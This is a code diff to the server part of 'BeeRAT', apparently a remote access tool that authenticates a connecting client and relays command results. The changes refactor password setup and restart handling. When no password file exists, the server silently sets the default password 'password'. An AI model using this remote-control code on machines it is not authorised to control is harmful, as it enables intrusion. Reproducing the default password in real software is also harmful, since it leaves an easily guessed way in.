@@ -22,6 +22,8 @@ class Server:
         self.log_file = os.path.join(os.path.dirname(__file__), 'BeeRAT-log.txt')
 
     def start(self):
+        if 'BeeRAT-password.txt' not in os.listdir(os.path.dirname(__file__)):
+            self.set_password('password')
         try:
             self.connection, self.address = self.listen()
             print(self.log(f'[+] [{self.get_time()}] [{self.address[0]}] is authenticating.'))
@@ -29,7 +31,7 @@ class Server:
             if password is None:
                 raise RestartServer
             password_hash = hashlib.sha256(password.encode()).hexdigest()
-            if password_hash == Server.get_password():
+            if password_hash == self.get_password():
                 self.send(True)
                 print(self.log(f'[+] [{self.get_time()}] [{self.address[0]}] connected.'))
             else:
@@ -72,10 +74,11 @@ class Server:
                     self.send(command_result)
         except ConnectionResetError:
             print(self.log(f'[-] [{self.get_time()}] [{self.address[0]}] disconnected.'))
-            raise RestartServer
+            self.start()
         except RestartServer:
-            self.run()
+            self.start()
         except Exception as e:
+            print(f'!!! {str(e)} !!!')
             self.send(str(e))
 
     def listen(self):
@@ -170,8 +173,6 @@ class Server:
 
 
 def main():
-    if 'BeeRAT-password.txt' not in os.listdir(os.path.dirname(__file__)):
-        Server.set_password('password')
     while True:
         try:
             command = input('BeeRAT-Server$ ').split(' ')
@@ -184,7 +185,7 @@ def main():
             elif command[0] == 'change-password':
                 password = ' '.join(command[1:])
                 if len(password) >= 8:
-                    Server.set_password(password)
+                    Server().set_password(password)
                     print('[+] Password saved successfully.')
                 else:
                     print('[-] password must be at least 8 characters long.')
